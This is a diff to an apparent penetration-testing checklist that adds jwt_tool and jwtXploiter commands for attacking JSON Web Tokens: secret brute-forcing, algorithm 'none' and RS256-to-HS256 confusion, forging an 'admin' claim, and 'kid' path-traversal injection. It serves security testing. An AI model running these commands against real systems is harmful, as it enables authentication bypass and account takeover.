@@ -283,21 +283,40 @@
 ##### JWT
 
 ###### Test JWT secret brute-forcing
-- [jwt_tool](https://github.com/ticarpi/jwt_tool)
+- jwt_tool
+  - `python3 jwt_tool.py <JWT> -C -d secrets.txt`
+  - <https://github.com/ticarpi/jwt_tool>
 - [jwt_cracker](https://github.com/lmammino/jwt-cracker)
 - [jwtcat](https://github.com/aress31/jwtcat)
 - [apicheck](https://github.com/BBVA/apicheck)
 - [jwtXploiter](https://github.com/DontPanicO/jwtXploiter)
+- [JWT Heartbreaker](https://github.com/wallarm/jwt-heartbreaker)
 
 ###### Abusing JWT Public Keys Without knowing the Public Key
 - [rsa_sig2n](https://github.com/silentsignal/rsa_sign2n)
 
 ###### Test if algorithm could be changed
+- Change algorithm to None
+  - jwt_tool
+    - `python3 jwt_tool.py <JWT> -X a`
+    - <https://github.com/ticarpi/jwt_tool>
+- Change algorithm from RS256 to HS256
+  - jtw_tool
+    - `python3 jwt_tool.py <JWT> -S hs256 -k public.pem`
+    - <https://github.com/ticarpi/jwt_tool>  
 - [jwt.io](https://jwt.io/#debugger-io)
 - [jwtcat](https://github.com/aress31/jwtcat)
 - [apicheck](https://github.com/BBVA/apicheck)
 - [JSON Web Token Attacker](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)
 - [jwtXploiter](https://github.com/DontPanicO/jwtXploiter)
+
+###### Test if signature is being validated
+- jwt_tool
+  - `python3 jwt_tool.py <JWT> -I -pc name -pv admin`
+  - <https://github.com/ticarpi/jwt_tool>
+- jtwXploiter
+  - `jwtxpl <JWT> -a hs256 -p <key>:<value> --unverified`
+  - <https://github.com/DontPanicO/jwtXploiter> 
 
 ###### Test token expiration time (TTL, RTTL)
 
@@ -305,7 +324,12 @@
 - [jwt.io](https://jwt.io/#debugger-io)
 
 ###### Check for Injection in "kid" element
-- [jwtXploiter](https://github.com/DontPanicO/jwtXploiter)
+- jwt_tool
+  - `python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""` 
+  - <https://github.com/ticarpi/jwt_tool>
+- jwtXploiter
+  - `jwtxpl <JWT> -a hs256 -p <key>:<value> --inject-kid "../../dev/null"`
+  - <https://github.com/DontPanicO/jwtXploiter>
 
 ###### Check for time constant verification for HMAC
 
